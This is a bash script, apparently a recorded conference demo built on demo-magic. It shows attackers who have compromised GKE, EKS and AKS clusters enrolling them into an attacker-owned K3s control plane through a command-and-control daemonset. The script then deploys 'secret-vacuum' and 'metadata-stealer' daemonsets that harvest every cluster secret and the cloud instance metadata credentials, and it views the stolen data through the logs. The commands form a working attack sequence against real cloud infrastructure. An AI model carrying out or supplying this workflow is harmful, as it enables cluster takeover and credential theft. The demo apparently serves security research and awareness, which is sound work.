#!/bin/bash

########################
# include the magic
########################
. ./lib/demo-magic.sh
TYPE_SPEED=25
cd 3-k3s-c2
clear

echo ""

p "# We are now on our attacker-owned K3s control plane on another\n cloud virtual machine"
p "kubectl get nodes"
gcloud compute --project=gke-c2 ssh k3s-control-plane --zone=us-east4-a 2> /dev/null -- "export KUBECONFIG=/var/k3s/config/kubeconfig.yaml; kubectl get nodes"
pe "clear"

kubectx gke_gke-c2_us-central1-a_gke-c2 2> /dev/null 1> /dev/null
p "# We also have a GKE cluster with 3 nodes that we have already compromised"
pe "kubectl get nodes"

p "# Let's look closely at our C2 daemonset"
pe "less c2.sh"

p "# Deploy our C2 to GKE"
pe "./c2.sh | kubectl apply -f -"

pe "kubectl get pods -n kube-system"
pe "clear"

p "Back on K3s, we can again run: kubectl get nodes"
gcloud compute --project=gke-c2 ssh k3s-control-plane --zone=us-east4-a 2> /dev/null -- "export KUBECONFIG=/var/k3s/config/kubeconfig.yaml; kubectl get nodes"
pe "clear"

kubectx bglonimbus@eks-c2.us-east-2.eksctl.io 2> /dev/null 1> /dev/null
p "# Not playing favorites, we also have a compromised EKS cluster"
pe "kubectl get nodes"

p "# Deploy our C2 to EKS"
pe "./c2.sh | kubectl apply -f -"
pe "clear"

kubectx aks-c2 2> /dev/null 1> /dev/null
p "# Finally, we have a compromised AKS cluster"
pe "kubectl get nodes"

p "# Deploy our C2 to AKS"
pe "./c2.sh | kubectl apply -f -"
pe "clear"

kubectx gke_gke-c2_us-central1-a_gke-c2 2> /dev/null 1> /dev/null
p "# Clean up our daemonset in GKE"
pe "kubectl delete -f c2.yaml"
sleep 5
pe "kubectl get pods --all-namespaces"
kubectx bglonimbus@eks-c2.us-east-2.eksctl.io 2> /dev/null 1> /dev/null
pe "clear"
p "# Clean up our daemonset in EKS"
pe "kubectl delete -f c2.yaml"
kubectx aks-c2 2> /dev/null 1> /dev/null
p "# Clean up our daemonset in AKS"
pe "kubectl delete -f c2.yaml"
pe "clear"

p "Back on K3s, we can again run: kubectl get nodes"
gcloud compute --project=gke-c2 ssh k3s-control-plane --zone=us-east4-a 2> /dev/null -- "export KUBECONFIG=/var/k3s/config/kubeconfig.yaml; kubectl get nodes"
pe "clear"

p "Here's a special daemonset to steal all secrets"
gcloud compute --project=gke-c2 ssh k3s-control-plane --zone=us-east4-a 2> /dev/null -- "export KUBECONFIG=/var/k3s/config/kubeconfig.yaml; cat secret-vacuum.yaml"
pe "clear"

p "Deploy the daemonset to steal all secrets"
gcloud compute --project=gke-c2 ssh k3s-control-plane --zone=us-east4-a 2> /dev/null -- "export KUBECONFIG=/var/k3s/config/kubeconfig.yaml; kubectl apply -f secret-vacuum.yaml"

sleep 5
p "View all the collected secrets"
gcloud compute --project=gke-c2 ssh k3s-control-plane --zone=us-east4-a 2> /dev/null -- "export KUBECONFIG=/var/k3s/config/kubeconfig.yaml; kubectl logs -l app=secret-logger --since=9s"
pe "clear"

p "Here's a special daemonset to steal all instance metadata credentials"
gcloud compute --project=gke-c2 ssh k3s-control-plane --zone=us-east4-a 2> /dev/null -- "export KUBECONFIG=/var/k3s/config/kubeconfig.yaml; cat metadata-stealer.yaml"

p "Deploy the daemonset to steal all instance metadata"
gcloud compute --project=gke-c2 ssh k3s-control-plane --zone=us-east4-a 2> /dev/null -- "export KUBECONFIG=/var/k3s/config/kubeconfig.yaml; kubectl apply -f metadata-stealer.yaml"

sleep 5
p "View all the collected metadata credentials"
gcloud compute --project=gke-c2 ssh k3s-control-plane --zone=us-east4-a 2> /dev/null -- "export KUBECONFIG=/var/k3s/config/kubeconfig.yaml; kubectl logs -l app=metadata --since=9s"

kubectx kind-kind 2> /dev/null 1> /dev/null
